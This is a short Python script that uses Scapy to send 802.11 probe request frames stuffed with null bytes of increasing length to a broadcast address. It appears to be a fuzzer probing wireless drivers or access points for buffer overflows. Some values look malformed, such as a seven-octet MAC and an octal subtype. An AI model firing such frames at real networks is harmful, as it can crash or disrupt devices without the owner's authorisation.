from scapy import *
from scapy.all import *




def sendprobereq_bo_null(target):
  for i in range (1,255):
    radiotap              = RadioTap()
    dot11                 = Dot11(type=0,subtype=0100,addr2=target)
    dot11probereq         = Dot11ProbeReq("00"*i)
    fuzz_frame            = radiotap/dot11/dot11probereq
    hexdump(fuzz_frame)
    sendp(fuzz_frame)



for i in range(10):
 sendprobereq_bo_null("ff:ff:ff:ff:ff:ff:ff")
